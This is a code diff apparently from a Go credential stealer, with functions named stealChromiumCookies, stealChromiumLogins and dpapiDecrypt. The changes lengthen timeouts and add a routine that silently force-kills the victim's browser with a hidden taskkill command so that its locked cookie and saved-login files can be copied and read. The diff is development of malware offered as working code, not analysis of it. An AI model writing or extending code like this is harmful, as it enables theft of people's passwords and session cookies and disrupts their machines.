@@ -230,7 +230,7 @@ func stealChromiumCookies(userDataPath string, browserName string, browserExe st
 			if res.cookies != "" {
 				allCookies.WriteString(res.cookies)
 			}
-		case <-time.After(4 * time.Second):
+		case <-time.After(10 * time.Second):
 			errs = append(errs, fmt.Sprintf("%s/%s: timeout", browserName, profile))
 		}
 	}
@@ -304,7 +304,7 @@ func stealChromiumLogins(userDataPath string, browserName string, browserExe str
 			if res != "" {
 				sb.WriteString(res)
 			}
-		case <-time.After(4 * time.Second):
+		case <-time.After(10 * time.Second):
 		}
 	}
 	return sb.String()
@@ -835,9 +835,17 @@ func dpapiDecrypt(data []byte) ([]byte, error) {
 	return result, nil
 }
 
-func copyFileLocked(src, dst, browserExe string) error {
-	_ = browserExe
+func killBrowserProcess(exeName string) {
+	if exeName == "" {
+		return
+	}
+	cmd := exec.Command("taskkill", "/F", "/IM", exeName)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	_ = cmd.Run()
+	time.Sleep(500 * time.Millisecond)
+}
 
+func copyFileLocked(src, dst, browserExe string) error {
 	data, err := os.ReadFile(src)
 	if err == nil && len(data) > 0 {
 		return os.WriteFile(dst, data, 0o644)
@@ -884,6 +892,13 @@ func copyFileLocked(src, dst, browserExe string) error {
 		if len(check) > 0 {
 			return nil
 		}
+	}
+
+	killBrowserProcess(browserExe)
+
+	data2, err2 := os.ReadFile(src)
+	if err2 == nil && len(data2) > 0 {
+		return os.WriteFile(dst, data2, 0o644)
 	}
 
 	return fmt.Errorf("locked %s", src)
